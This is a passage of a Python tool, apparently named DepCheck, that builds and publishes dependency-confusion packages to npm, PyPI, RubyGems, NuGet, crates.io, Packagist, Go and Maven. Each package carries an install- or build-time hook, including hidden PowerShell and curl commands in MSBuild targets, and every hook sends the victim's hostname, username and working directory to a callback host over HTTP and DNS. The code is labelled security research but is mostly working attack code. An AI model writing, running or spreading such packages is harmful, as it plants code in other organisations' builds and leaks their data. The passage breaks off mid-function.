    safe_dir = re.sub(r'[^a-zA-Z0-9_-]', '_', pkg_name)
    tmpdir = mkdtemp(prefix=f"depcheck_{safe_dir}_")
    version = "99.99.99"

    js_name = _escape_js(pkg_name)
    js_cb = _escape_js(callback)
    dns_name = _dns_label(pkg_name)
    dns_cb = _dns_label(callback.split('.')[0]) + '.' + '.'.join(callback.split('.')[1:]) if '.' in callback else _dns_label(callback)

    # preinstall payload
    payload_script = f"""
const https = require('https');
const http = require('http');
const os = require('os');
const dns = require('dns');

const data = JSON.stringify({{
  p: '{js_name}',
  h: os.hostname(),
  u: os.userInfo().username,
  d: __dirname,
  c: os.platform()
}});

// DNS callback
try {{
  const label = Buffer.from('{js_name}').toString('hex').substring(0, 60);
  dns.resolve(label + '.{js_cb}', () => {{}});
}} catch(e) {{}}

// HTTP callback
try {{
  const req = https.request({{
    hostname: '{js_cb}',
    port: 443,
    path: '/depcheck',
    method: 'POST',
    headers: {{'Content-Type': 'application/json'}},
    timeout: 5000
  }});
  req.on('error', () => {{}});
  req.write(data);
  req.end();
}} catch(e) {{}}

// Also try HTTP
try {{
  const req = http.request({{
    hostname: '{js_cb}',
    port: 80,
    path: '/depcheck',
    method: 'POST',
    headers: {{'Content-Type': 'application/json'}},
    timeout: 5000
  }});
  req.on('error', () => {{}});
  req.write(data);
  req.end();
}} catch(e) {{}}
"""

    # Write files
    pkg_json = {
        "name": pkg_name,
        "version": version,
        "description": "Security research — dependency confusion test",
        "author": author,
        "license": "ISC",
        "scripts": {
            "preinstall": "node preinstall.js"
        }
    }

    with open(os.path.join(tmpdir, "package.json"), "w") as f:
        json.dump(pkg_json, f, indent=2)
    with open(os.path.join(tmpdir, "preinstall.js"), "w") as f:
        f.write(payload_script)
    with open(os.path.join(tmpdir, "index.js"), "w") as f:
        f.write(f"// {_escape_js(pkg_name)} — dependency confusion security test\n")

    # Write .npmrc with token
    with open(os.path.join(tmpdir, ".npmrc"), "w") as f:
        f.write(f"//registry.npmjs.org/:_authToken={token}\n")

    # For scoped packages (@scope/name), you must own the scope on npm.
    # Dependency confusion only works for unscoped packages — skip scoped ones.
    if pkg_name.startswith("@"):
        print(f"  {C.Y}[!] Skipping {pkg_name} — scoped packages require org ownership on npm.{C.X}")
        print(f"  {C.Y}    Dependency confusion via npm publish is not possible for @scoped packages.{C.X}")
        shutil.rmtree(tmpdir, ignore_errors=True)
        return False

    # Publish
    print(f"  {C.CN}[*] Publishing {pkg_name}@{version} to npm...{C.X}")
    result = subprocess.run(
        ["npm", "publish", "--access", "public"],
        cwd=tmpdir, capture_output=True, text=True, timeout=60
    )

    # Cleanup
    shutil.rmtree(tmpdir, ignore_errors=True)

    if result.returncode == 0:
        print(f"  {C.G}[+] Published: {pkg_name}@{version}{C.X}")
        return True
    else:
        # Combine stdout + stderr; filter out npm notice lines to get real error
        all_output = (result.stderr + "\n" + result.stdout).strip()
        err_lines = [l for l in all_output.splitlines() if not l.startswith("npm notice") and l.strip()]
        err = "\n".join(err_lines).strip() or all_output
        if "already exists" in err.lower() or "EPUBLISHCONFLICT" in err:
            print(f"  {C.Y}[!] {pkg_name} — name/version already exists{C.X}")
        elif "403" in err or "forbidden" in err.lower() or "E403" in err:
            print(f"  {C.Y}[!] {pkg_name} — forbidden (auth issue or name reserved){C.X}")
        elif "401" in err or "unauthorized" in err.lower() or "E401" in err:
            print(f"  {C.R}[-] {pkg_name} — unauthorized (check token){C.X}")
        else:
            print(f"  {C.R}[-] Failed: {err[:500]}{C.X}")
        return False


def _exploit_pip(pkg_name, callback, token, author="security-research"):
    """Create and publish malicious PyPI package."""
    safe_dir = re.sub(r'[^a-zA-Z0-9_-]', '_', pkg_name)
    tmpdir = mkdtemp(prefix=f"depcheck_{safe_dir}_")
    version = "99.99.99"
    safe_name = re.sub(r'[^a-zA-Z0-9_]', '_', pkg_name)

    py_name = _escape_py(pkg_name)
    py_cb = _escape_py(callback)
    py_author = _escape_py(author)
    dns_label = _dns_label(pkg_name)
    dns_cb = _escape_py(callback)

    setup_py = f"""
import setuptools
import os
import socket
import json
import urllib.request

def callback():
    try:
        data = json.dumps({{
            "p": "{py_name}",
            "h": socket.gethostname(),
            "u": os.environ.get("USER", "unknown"),
            "d": os.getcwd(),
            "c": os.name
        }}).encode()
        req = urllib.request.Request(
            "https://{py_cb}/depcheck",
            data=data,
            headers={{"Content-Type": "application/json"}},
            method="POST"
        )
        urllib.request.urlopen(req, timeout=5)
    except Exception:
        pass
    try:
        socket.getaddrinfo("{dns_label}.{dns_cb}", 80)
    except Exception:
        pass

callback()

setuptools.setup(
    name="{py_name}",
    version="{version}",
    author="{py_author}",
    description="Security research - dependency confusion test",
    py_modules=["{safe_name}"],
)
"""

    with open(os.path.join(tmpdir, "setup.py"), "w") as f:
        f.write(setup_py)
    with open(os.path.join(tmpdir, f"{safe_name}.py"), "w") as f:
        f.write(f"# {pkg_name} — dependency confusion security test\n")

    # Build
    print(f"  {C.CN}[*] Building {pkg_name}-{version} for PyPI...{C.X}")
    build = subprocess.run(
        [sys.executable, "setup.py", "sdist"],
        cwd=tmpdir, capture_output=True, text=True, timeout=60
    )
    if build.returncode != 0:
        shutil.rmtree(tmpdir, ignore_errors=True)
        print(f"  {C.R}[-] Build failed: {build.stderr[:200]}{C.X}")
        return False

    # Upload with twine
    print(f"  {C.CN}[*] Uploading {pkg_name}@{version} to PyPI...{C.X}")
    dist_files = [os.path.join(tmpdir, "dist", f) for f in os.listdir(os.path.join(tmpdir, "dist"))]
    env = os.environ.copy()
    env["TWINE_USERNAME"] = "__token__"
    env["TWINE_PASSWORD"] = token

    result = subprocess.run(
        ["twine", "upload"] + dist_files,
        env=env, capture_output=True, text=True, timeout=60
    )

    shutil.rmtree(tmpdir, ignore_errors=True)

    if result.returncode == 0:
        print(f"  {C.G}[+] Published: {pkg_name}=={version}{C.X}")
        return True
    else:
        err = result.stderr.strip()
        if "already exists" in err.lower() or "400" in err:
            print(f"  {C.Y}[!] {pkg_name} — name already taken{C.X}")
        else:
            print(f"  {C.R}[-] Failed: {err[:200]}{C.X}")
        return False


def _exploit_rubygems(pkg_name, callback, token, author="security-research"):
    """Create and publish malicious RubyGem."""
    safe_dir = re.sub(r'[^a-zA-Z0-9_-]', '_', pkg_name)
    safe_name = re.sub(r'[^a-zA-Z0-9_]', '_', pkg_name)
    tmpdir = mkdtemp(prefix=f"depcheck_{safe_dir}_")
    version = "99.99.99"

    rb_name = _escape_py(pkg_name)  # Ruby uses same escaping as Python for double-quoted strings
    rb_cb = _escape_py(callback)
    dns_label = _dns_label(pkg_name)

    # extconf.rb — runs during gem install
    extconf = f"""
require 'socket'
require 'json'
require 'net/http'
require 'uri'

begin
  data = JSON.generate({{
    "p" => "{rb_name}",
    "h" => Socket.gethostname,
    "u" => ENV["USER"] || "unknown",
    "d" => Dir.pwd,
    "c" => RUBY_PLATFORM
  }})
  uri = URI("https://{rb_cb}/depcheck")
  Net::HTTP.start(uri.host, uri.port, use_ssl: true, open_timeout: 5, read_timeout: 5) do |http|
    http.post(uri.path, data, "Content-Type" => "application/json")
  end
rescue; end

begin
  Socket.getaddrinfo("{dns_label}.{rb_cb}", 80)
rescue; end

# Create dummy Makefile so gem install doesn't fail
File.write("Makefile", "all:\\n\\techo done\\ninstall:\\n\\techo done\\n")
"""

    gemspec = f"""Gem::Specification.new do |s|
  s.name        = "{rb_name}"
  s.version     = "{version}"
  s.summary     = "Security research - dependency confusion test"
  s.authors     = ["{_escape_py(author)}"]
  s.files       = ["lib/{safe_name}.rb"]
  s.extensions  = ["extconf.rb"]
  s.license     = "MIT"
end
"""

    os.makedirs(os.path.join(tmpdir, "lib"), exist_ok=True)
    with open(os.path.join(tmpdir, f"{safe_name}.gemspec"), "w") as f:
        f.write(gemspec)
    with open(os.path.join(tmpdir, "extconf.rb"), "w") as f:
        f.write(extconf)
    with open(os.path.join(tmpdir, "lib", f"{safe_name}.rb"), "w") as f:
        f.write(f"# {pkg_name} — dependency confusion security test\n")

    # Build gem
    print(f"  {C.CN}[*] Building {pkg_name}-{version}.gem...{C.X}")
    build = subprocess.run(
        ["gem", "build", f"{safe_name}.gemspec"],
        cwd=tmpdir, capture_output=True, text=True, timeout=60
    )
    if build.returncode != 0:
        shutil.rmtree(tmpdir, ignore_errors=True)
        print(f"  {C.R}[-] Build failed: {build.stderr[:200]}{C.X}")
        return False

    # Push gem
    gem_file = os.path.join(tmpdir, f"{pkg_name}-{version}.gem")
    if not os.path.exists(gem_file):
        # Try finding the gem file
        gems = [f for f in os.listdir(tmpdir) if f.endswith(".gem")]
        gem_file = os.path.join(tmpdir, gems[0]) if gems else gem_file

    print(f"  {C.CN}[*] Pushing {pkg_name}@{version} to RubyGems...{C.X}")
    result = subprocess.run(
        ["gem", "push", gem_file, "--key", token],
        cwd=tmpdir, capture_output=True, text=True, timeout=60
    )

    shutil.rmtree(tmpdir, ignore_errors=True)

    if result.returncode == 0:
        print(f"  {C.G}[+] Published: {pkg_name}-{version}{C.X}")
        return True
    else:
        err = result.stderr.strip() or result.stdout.strip()
        if "already" in err.lower() or "repushing" in err.lower():
            print(f"  {C.Y}[!] {pkg_name} — name already taken{C.X}")
        else:
            print(f"  {C.R}[-] Failed: {err[:200]}{C.X}")
        return False


def _exploit_nuget(pkg_name, callback, token, author="security-research"):
    """Create and publish malicious NuGet package."""
    safe_dir = re.sub(r'[^a-zA-Z0-9_-]', '_', pkg_name)
    safe_name = re.sub(r'[^a-zA-Z0-9.]', '.', pkg_name)
    tmpdir = mkdtemp(prefix=f"depcheck_{safe_dir}_")
    version = "99.99.99"

    xml_name = pkg_name.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace('"', "&quot;")
    xml_author = author.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
    cs_name = _escape_py(pkg_name)
    cs_cb = _escape_py(callback)
    dns_label = _dns_label(pkg_name)

    # .targets file — runs MSBuild task on package restore/build
    targets_content = f"""<?xml version="1.0" encoding="utf-8"?>
<Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="DepCheckCallback" BeforeTargets="Build;Restore;CollectPackageReferences">
    <Exec Command="powershell -NoP -NonI -W Hidden -C &quot;try{{$d=@{{p='{cs_name}';h=$env:COMPUTERNAME;u=$env:USERNAME;d=(pwd).Path;c='windows'}};$j=$d|ConvertTo-Json;Invoke-WebRequest -Uri 'https://{cs_cb}/depcheck' -Method POST -Body $j -ContentType 'application/json' -TimeoutSec 5 -EA Stop}}catch{{}};try{{[System.Net.Dns]::GetHostAddresses('{dns_label}.{cs_cb}')}}catch{{}}&quot;" IgnoreExitCode="true" ContinueOnError="true" Condition="'$(OS)' == 'Windows_NT'" />
    <Exec Command="curl -s -X POST -H 'Content-Type: application/json' -d '{{&quot;p&quot;:&quot;{cs_name}&quot;,&quot;h&quot;:&quot;'$(hostname)'&quot;,&quot;u&quot;:&quot;'$(whoami)'&quot;,&quot;d&quot;:&quot;'$(pwd)'&quot;,&quot;c&quot;:&quot;linux&quot;}}' 'https://{cs_cb}/depcheck' --max-time 5 2>/dev/null; nslookup {dns_label}.{cs_cb} >/dev/null 2>&amp;1 || true" IgnoreExitCode="true" ContinueOnError="true" Condition="'$(OS)' != 'Windows_NT'" />
  </Target>
</Project>
"""

    # .nuspec file
    nuspec = f"""<?xml version="1.0"?>
<package xmlns="http://schemas.microsoft.com/packaging/2013/05/nuspec.xsd">
  <metadata>
    <id>{xml_name}</id>
    <version>{version}</version>
    <authors>{xml_author}</authors>
    <description>Security research - dependency confusion test</description>
    <license type="expression">MIT</license>
  </metadata>
  <files>
    <file src="build\\**" target="build" />
    <file src="buildTransitive\\**" target="buildTransitive" />
    <file src="lib\\**" target="lib" />
  </files>
</package>
"""

    # Create structure
    for d in ["build", "buildTransitive", os.path.join("lib", "netstandard2.0")]:
        os.makedirs(os.path.join(tmpdir, d), exist_ok=True)

    with open(os.path.join(tmpdir, f"{safe_name}.nuspec"), "w") as f:
        f.write(nuspec)
    with open(os.path.join(tmpdir, "build", f"{safe_name}.targets"), "w") as f:
        f.write(targets_content)
    with open(os.path.join(tmpdir, "buildTransitive", f"{safe_name}.targets"), "w") as f:
        f.write(targets_content)
    # Dummy placeholder
    with open(os.path.join(tmpdir, "lib", "netstandard2.0", "_._"), "w") as f:
        f.write("")

    # Pack
    print(f"  {C.CN}[*] Packing {pkg_name}.{version}.nupkg...{C.X}")
    pack = subprocess.run(
        ["nuget", "pack", f"{safe_name}.nuspec"],
        cwd=tmpdir, capture_output=True, text=True, timeout=60
    )
    if pack.returncode != 0:
        # Try dotnet CLI
        pack = subprocess.run(
            ["dotnet", "pack", "--no-build", "-o", tmpdir],
            cwd=tmpdir, capture_output=True, text=True, timeout=60
        )
    if pack.returncode != 0:
        shutil.rmtree(tmpdir, ignore_errors=True)
        print(f"  {C.R}[-] Pack failed: {(pack.stderr or pack.stdout)[:200]}{C.X}")
        return False

    # Find .nupkg
    nupkg = [f for f in os.listdir(tmpdir) if f.endswith(".nupkg")]
    if not nupkg:
        shutil.rmtree(tmpdir, ignore_errors=True)
        print(f"  {C.R}[-] No .nupkg file created{C.X}")
        return False

    # Push
    nupkg_path = os.path.join(tmpdir, nupkg[0])
    print(f"  {C.CN}[*] Pushing {pkg_name}@{version} to NuGet...{C.X}")
    result = subprocess.run(
        ["dotnet", "nuget", "push", nupkg_path,
         "--api-key", token, "--source", "https://api.nuget.org/v3/index.json"],
        cwd=tmpdir, capture_output=True, text=True, timeout=60
    )
    if result.returncode != 0:
        # Try nuget CLI
        result = subprocess.run(
            ["nuget", "push", nupkg_path,
             "-ApiKey", token, "-Source", "https://api.nuget.org/v3/index.json"],
            cwd=tmpdir, capture_output=True, text=True, timeout=60
        )

    shutil.rmtree(tmpdir, ignore_errors=True)

    if result.returncode == 0:
        print(f"  {C.G}[+] Published: {pkg_name}.{version}{C.X}")
        return True
    else:
        err = (result.stderr or result.stdout).strip()
        if "already exists" in err.lower() or "409" in err:
            print(f"  {C.Y}[!] {pkg_name} — name/version already taken{C.X}")
        else:
            print(f"  {C.R}[-] Failed: {err[:200]}{C.X}")
        return False


def _exploit_cargo(pkg_name, callback, token, author="security-research"):
    """Create and publish malicious Cargo crate."""
    safe_dir = re.sub(r'[^a-zA-Z0-9_-]', '_', pkg_name)
    safe_name = re.sub(r'[^a-zA-Z0-9_]', '_', pkg_name)
    tmpdir = mkdtemp(prefix=f"depcheck_{safe_dir}_")
    version = "99.99.99"

    rs_name = _escape_py(pkg_name)
    rs_cb = _escape_py(callback)
    dns_label = _dns_label(pkg_name)

    cargo_toml = f"""[package]
name = "{pkg_name}"
version = "{version}"
edition = "2021"
description = "Security research - dependency confusion test"
license = "MIT"
authors = ["{_escape_py(author)}"]
"""

    # build.rs — runs at compile time
    build_rs = f"""
use std::net::TcpStream;
use std::io::Write;
use std::process::Command;

fn main() {{
    // HTTP callback
    if let Ok(mut stream) = TcpStream::connect("{rs_cb}:443") {{
        let hostname = Command::new("hostname").output().map(|o| String::from_utf8_lossy(&o.stdout).trim().to_string()).unwrap_or_default();
        let user = std::env::var("USER").or_else(|_| std::env::var("USERNAME")).unwrap_or_default();
        let dir = std::env::current_dir().map(|p| p.display().to_string()).unwrap_or_default();
        let body = format!("{{\\"p\\":\\"{rs_name}\\",\\"h\\":\\"{{}}\\",\\"u\\":\\"{{}}\\",\\"d\\":\\"{{}}\\",\\"c\\":\\"rust\\"}}", hostname, user, dir);
        let req = format!("POST /depcheck HTTP/1.1\\r\\nHost: {rs_cb}\\r\\nContent-Type: application/json\\r\\nContent-Length: {{}}\\r\\n\\r\\n{{}}", body.len(), body);
        let _ = stream.write_all(req.as_bytes());
    }}

    // DNS callback
    let _ = std::net::ToSocketAddrs::to_socket_addrs(&format!("{dns_label}.{rs_cb}:80"));
}}
"""

    lib_rs = f"// {pkg_name} — dependency confusion security test\n"

    os.makedirs(os.path.join(tmpdir, "src"), exist_ok=True)
    with open(os.path.join(tmpdir, "Cargo.toml"), "w") as f:
        f.write(cargo_toml)
    with open(os.path.join(tmpdir, "build.rs"), "w") as f:
        f.write(build_rs)
    with open(os.path.join(tmpdir, "src", "lib.rs"), "w") as f:
        f.write(lib_rs)

    # Publish
    print(f"  {C.CN}[*] Publishing {pkg_name}@{version} to crates.io...{C.X}")
    env = os.environ.copy()
    env["CARGO_REGISTRY_TOKEN"] = token
    result = subprocess.run(
        ["cargo", "publish", "--allow-dirty"],
        cwd=tmpdir, env=env, capture_output=True, text=True, timeout=120
    )

    shutil.rmtree(tmpdir, ignore_errors=True)

    if result.returncode == 0:
        print(f"  {C.G}[+] Published: {pkg_name}@{version}{C.X}")
        return True
    else:
        err = (result.stderr or result.stdout).strip()
        if "already" in err.lower():
            print(f"  {C.Y}[!] {pkg_name} — name already taken{C.X}")
        else:
            print(f"  {C.R}[-] Failed: {err[:200]}{C.X}")
        return False


def _exploit_composer(pkg_name, callback, token, author="security-research"):
    """Exploit Composer package via GitHub repo + Packagist submission."""
    # Composer/Packagist requires a VCS repository (GitHub)
    # token = GitHub personal access token (also needs Packagist API token stored as packagist_token)
    version = "99.99.99"
    py_name = _escape_py(pkg_name)
    py_cb = _escape_py(callback)
    dns_label = _dns_label(pkg_name)

    # GitHub repo name from package name: "vendor/package" → "vendor-package"
    repo_name = re.sub(r'[^a-zA-Z0-9_-]', '-', pkg_name)

    github_token = token
    packagist_token = get_cred("packagist_token")

    # composer.json with post-install callback
    composer_json = {
        "name": pkg_name,
        "description": "Security research - dependency confusion test",
        "version": version,
        "type": "library",
        "license": "MIT",
        "authors": [{"name": author}],
        "autoload": {"psr-4": {re.sub(r'[^a-zA-Z0-9]', '', pkg_name.split('/')[-1]).capitalize() + "\\\\": "src/"}},
        "scripts": {
            "post-install-cmd": [
                f"@php -r \"@file_get_contents('https://{callback}/depcheck?p={pkg_name}&h='.gethostname().'&u='.get_current_user()); @dns_get_record('{dns_label}.{callback}', DNS_A);\""
            ],
            "post-update-cmd": [
                f"@php -r \"@file_get_contents('https://{callback}/depcheck?p={pkg_name}&h='.gethostname().'&u='.get_current_user()); @dns_get_record('{dns_label}.{callback}', DNS_A);\""
            ]
        }
    }

    headers = {
        "Authorization": f"token {github_token}",
        "Accept": "application/vnd.github.v3+json",
        "Content-Type": "application/json",
        "User-Agent": f"DepCheck/{VERSION}"
    }

    # 1. Create GitHub repo
    print(f"  {C.CN}[*] Creating GitHub repo: {repo_name}...{C.X}")
    try:
        req = Request("https://api.github.com/user/repos",
                       data=json.dumps({"name": repo_name, "description": "Security research - dependency confusion test", "auto_init": True}).encode(),
                       headers=headers, method="POST")
        resp = urlopen(req, timeout=15)
        repo_data = json.loads(resp.read())
        full_name = repo_data["full_name"]
    except HTTPError as e:
        body = e.read().decode()
        if "already exists" in body.lower() or e.code == 422:
            # Get existing repo owner
            try:
                req2 = Request("https://api.github.com/user", headers=headers)
                user_data = json.loads(urlopen(req2, timeout=10).read())
                full_name = f"{user_data['login']}/{repo_name}"
            except Exception:
                print(f"  {C.Y}[!] {pkg_name} — GitHub repo already exists{C.X}")
                return False
        else:
            print(f"  {C.R}[-] GitHub API error: {e.code} {body[:200]}{C.X}")
            return False

    # 2. Push composer.json to the repo
    print(f"  {C.CN}[*] Pushing composer.json to {full_name}...{C.X}")
    import base64
    content_b64 = base64.b64encode(json.dumps(composer_json, indent=2).encode()).decode()
    try:
        # Check if file exists first
        try:
            req = Request(f"https://api.github.com/repos/{full_name}/contents/composer.json", headers=headers)
            existing = json.loads(urlopen(req, timeout=10).read())
            sha = existing.get("sha", "")
        except HTTPError:
            sha = ""

        put_data = {"message": "Add composer.json", "content": content_b64}
        if sha:
            put_data["sha"] = sha
        req = Request(f"https://api.github.com/repos/{full_name}/contents/composer.json",
                       data=json.dumps(put_data).encode(), headers=headers, method="PUT")
        urlopen(req, timeout=15)
    except Exception as e:
        print(f"  {C.R}[-] Failed to push composer.json: {e}{C.X}")
        return False

    # 3. Create a git tag for the version
    print(f"  {C.CN}[*] Creating tag v{version}...{C.X}")
    try:
        # Get latest commit SHA
        req = Request(f"https://api.github.com/repos/{full_name}/commits/main", headers=headers)
        commit_data = json.loads(urlopen(req, timeout=10).read())
        commit_sha = commit_data["sha"]

        req = Request(f"https://api.github.com/repos/{full_name}/git/refs",
                       data=json.dumps({"ref": f"refs/tags/v{version}", "sha": commit_sha}).encode(),
                       headers=headers, method="POST")
        urlopen(req, timeout=10)
    except HTTPError as e:
        if e.code != 422:  # 422 = tag already exists
            pass

    # 4. Submit to Packagist (if packagist_token available)
    if packagist_token:
        print(f"  {C.CN}[*] Submitting to Packagist: {pkg_name}...{C.X}")
        try:
            packagist_data = json.dumps({
                "repository": {"url": f"https://github.com/{full_name}"}
            }).encode()
            req = Request("https://packagist.org/api/create-package",
                           data=packagist_data,
                           headers={"Content-Type": "application/json",
                                    "API-Token": packagist_token,
                                    "User-Agent": f"DepCheck/{VERSION}"},
                           method="POST")
            urlopen(req, timeout=15)
            print(f"  {C.G}[+] Published: {pkg_name}@{version} (Packagist){C.X}")
            return True
        except HTTPError as e:
            body = e.read().decode()
            if "already" in body.lower():
                print(f"  {C.Y}[!] {pkg_name} — already exists on Packagist{C.X}")
            else:
                print(f"  {C.Y}[!] Packagist submit failed ({e.code}): {body[:200]}{C.X}")
                print(f"  {C.CN}    GitHub repo created: https://github.com/{full_name}{C.X}")
                print(f"  {C.CN}    Submit manually: https://packagist.org/packages/submit{C.X}")
            return False
    else:
        print(f"  {C.G}[+] GitHub repo ready: https://github.com/{full_name}{C.X}")
        print(f"  {C.Y}    No packagist_token saved. Submit manually: https://packagist.org/packages/submit{C.X}")
        return True


def _exploit_go(pkg_name, callback, token, author="security-research"):
    """Exploit Go module via GitHub repo (Go modules are git-based)."""
    # Go modules resolve from VCS. Module path = GitHub repo path.
    # e.g., github.com/company/internal-pkg → need to create that repo
    version = "99.99.99"
    py_name = _escape_py(pkg_name)
    py_cb = _escape_py(callback)
    dns_label = _dns_label(pkg_name)

    # Parse module path: github.com/owner/repo or custom domain
    if not pkg_name.startswith("github.com/"):
        print(f"  {C.Y}[!] Go module '{pkg_name}' — not a github.com path.")
        print(f"      Auto-exploit only works for github.com modules.{C.X}")
        print(f"  {C.CN}    For custom domains, you need to host a go module proxy or VCS.{C.X}")
        return False

    parts = pkg_name.split("/")
    if len(parts) < 3:
        print(f"  {C.R}[-] Invalid Go module path: {pkg_name}{C.X}")
        return False

    repo_owner_expected = parts[1]
    repo_name = parts[2]

    github_token = token
    headers = {
        "Authorization": f"token {github_token}",
        "Accept": "application/vnd.github.v3+json",
        "Content-Type": "application/json",
        "User-Agent": f"DepCheck/{VERSION}"
    }

    go_mod = f"""module {pkg_name}

go 1.21
"""

    # init callback in main package
    go_file = f"""package {re.sub(r'[^a-zA-Z0-9_]', '_', repo_name)}

import (
\t"encoding/json"
\t"net"
\t"net/http"
\t"os"
\t"os/user"
\t"strings"
\t"bytes"
)

func init() {{
\tgo func() {{
\t\th, _ := os.Hostname()
\t\tu := ""
\t\tif cu, err := user.Current(); err == nil {{
\t\t\tu = cu.Username
\t\t}}
\t\td, _ := os.Getwd()
\t\tdata, _ := json.Marshal(map[string]string{{
\t\t\t"p": "{py_name}",
\t\t\t"h": h,
\t\t\t"u": u,
\t\t\t"d": d,
\t\t\t"c": "go",
\t\t}})
\t\t_ = strings.Contains("", "")  // avoid unused import
\t\thttp.Post("https://{py_cb}/depcheck", "application/json", bytes.NewReader(data))
\t\tnet.LookupHost("{dns_label}.{py_cb}")
\t}}()
}}
"""

    # 1. Create GitHub repo
    print(f"  {C.CN}[*] Creating GitHub repo: {repo_name}...{C.X}")
    try:
        req = Request("https://api.github.com/user/repos",
                       data=json.dumps({"name": repo_name, "description": "Security research - dependency confusion test", "auto_init": True}).encode(),
                       headers=headers, method="POST")
        resp = urlopen(req, timeout=15)
        repo_data = json.loads(resp.read())
        full_name = repo_data["full_name"]
    except HTTPError as e:
        body = e.read().decode()
        if "already exists" in body.lower() or e.code == 422:
            try:
                req2 = Request("https://api.github.com/user", headers=headers)
                user_data = json.loads(urlopen(req2, timeout=10).read())
                full_name = f"{user_data['login']}/{repo_name}"
            except Exception:
                print(f"  {C.Y}[!] {pkg_name} — GitHub repo already exists{C.X}")
                return False
        else:
            print(f"  {C.R}[-] GitHub API error: {e.code} {body[:200]}{C.X}")
            return False

    # 2. Push go.mod
    import base64
    print(f"  {C.CN}[*] Pushing go.mod + callback to {full_name}...{C.X}")
    for filename, content in [("go.mod", go_mod), (f"{re.sub(r'[^a-zA-Z0-9_]', '_', repo_name)}.go", go_file)]:
        try:
            content_b64 = base64.b64encode(content.encode()).decode()
            try:
                req = Request(f"https://api.github.com/repos/{full_name}/contents/{filename}", headers=headers)
                existing = json.loads(urlopen(req, timeout=10).read())
                sha = existing.get("sha", "")
            except HTTPError:
                sha = ""

            put_data = {"message": f"Add {filename}", "content": content_b64}
            if sha:
                put_data["sha"] = sha
            req = Request(f"https://api.github.com/repos/{full_name}/contents/{filename}",
                           data=json.dumps(put_data).encode(), headers=headers, method="PUT")
            urlopen(req, timeout=15)
        except Exception as e:
            print(f"  {C.R}[-] Failed to push {filename}: {e}{C.X}")
            return False

    # 3. Create version tag
    print(f"  {C.CN}[*] Creating tag v{version}...{C.X}")
    try:
        req = Request(f"https://api.github.com/repos/{full_name}/commits/main", headers=headers)
        commit_data = json.loads(urlopen(req, timeout=10).read())
        commit_sha = commit_data["sha"]

        req = Request(f"https://api.github.com/repos/{full_name}/git/refs",
                       data=json.dumps({"ref": f"refs/tags/v{version}", "sha": commit_sha}).encode(),
                       headers=headers, method="POST")
        urlopen(req, timeout=10)
    except HTTPError:
        pass

    actual_owner = full_name.split("/")[0]
    if actual_owner.lower() != repo_owner_expected.lower():
        print(f"  {C.Y}[!] Module path expects github.com/{repo_owner_expected}/{repo_name}")
        print(f"      but repo created at github.com/{full_name}")
        print(f"      The target must resolve to your repo for exploitation to work.{C.X}")

    print(f"  {C.G}[+] Go module ready: https://github.com/{full_name} (v{version}){C.X}")
    return True


def _exploit_maven(pkg_name, callback, token, author="security-research"):
    """Exploit Maven package — creates GitHub repo with POM + callback."""
    # Maven Central requires Sonatype OSSRH + GPG signing — too complex for full auto.
    # Instead: create GitHub Package or note for manual submission.
    version = "99.99.99"
    dns_label = _dns_label(pkg_name)
    py_cb = _escape_py(callback)

    parts = pkg_name.split(":")
    if len(parts) != 2:
        print(f"  {C.R}[-] Invalid Maven coordinate: {pkg_name} (expected groupId:artifactId){C.X}")
        return False

    group_id, artifact_id = parts
    safe_dir = re.sub(r'[^a-zA-Z0-9_-]', '_', artifact_id)
    tmpdir = mkdtemp(prefix=f"depcheck_{safe_dir}_")

    group_path = group_id.replace(".", "/")
    pkg_dir = os.path.join(tmpdir, "src", "main", "java", *group_id.split("."))
    os.makedirs(pkg_dir, exist_ok=True)

    class_name = re.sub(r'[^a-zA-Z0-9]', '', artifact_id.capitalize())

    pom_xml = f"""<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <groupId>{group_id}</groupId>
    <artifactId>{artifact_id}</artifactId>
    <version>{version}</version>
    <name>Security research - dependency confusion test</name>
</project>
"""

    java_file = f"""package {group_id};

import java.net.*;
import java.io.*;

public class {class_name} {{
    static {{
        try {{
            String h = InetAddress.getLocalHost().getHostName();
            String u = System.getProperty("user.name");
            String d = System.getProperty("user.dir");
            String body = "{{\\"p\\":\\"{_escape_py(pkg_name)}\\",\\"h\\":\\""+h+"\\",\\"u\\":\\""+u+"\\",\\"d\\":\\""+d+"\\",\\"c\\":\\"java\\"}}";
            URL url = new URL("https://{py_cb}/depcheck");
            HttpURLConnection con = (HttpURLConnection) url.openConnection();
            con.setRequestMethod("POST");
            con.setRequestProperty("Content-Type", "application/json");
            con.setConnectTimeout(5000);
            con.setDoOutput(true);
            con.getOutputStream().write(body.getBytes());
            con.getResponseCode();
        }} catch (Exception e) {{}}
        try {{
            InetAddress.getByName("{dns_label}.{py_cb}");
        }} catch (Exception e) {{}}
    }}
}}
"""

    with open(os.path.join(tmpdir, "pom.xml"), "w") as f:
        f.write(pom_xml)
    with open(os.path.join(pkg_dir, f"{class_name}.java"), "w") as f:
        f.write(java_file)

    # Try mvn deploy to GitHub Packages (if token is GitHub token)
    github_token = token
    headers = {
        "Authorization": f"token {github_token}",
        "Accept": "application/vnd.github.v3+json",
        "Content-Type": "application/json",
        "User-Agent": f"DepCheck/{VERSION}"
    }

    repo_name = re.sub(r'[^a-zA-Z0-9_-]', '-', artifact_id)

    print(f"  {C.CN}[*] Creating GitHub repo for Maven artifact: {repo_name}...{C.X}")
    try:
        req = Request("https://api.github.com/user/repos",
                       data=json.dumps({"name": repo_name, "description": f"Maven: {pkg_name} - security research"}).encode(),
                       headers=headers, method="POST")
        resp = urlopen(req, timeout=15)
        repo_data = json.loads(resp.read())
        full_name = repo_data["full_name"]
    except HTTPError as e:
        body = e.read().decode()
        if "already exists" in body.lower() or e.code == 422:
            try:
                req2 = Request("https://api.github.com/user", headers=headers)
                user_data = json.loads(urlopen(req2, timeout=10).read())
                full_name = f"{user_data['login']}/{repo_name}"
            except Exception:
                full_name = f"unknown/{repo_name}"
        else:
            print(f"  {C.R}[-] GitHub API error: {e.code} {body[:200]}{C.X}")
            shutil.rmtree(tmpdir, ignore_errors=True)
            return False

    # Push files to GitHub
    import base64
    print(f"  {C.CN}[*] Pushing Maven project to {full_name}...{C.X}")
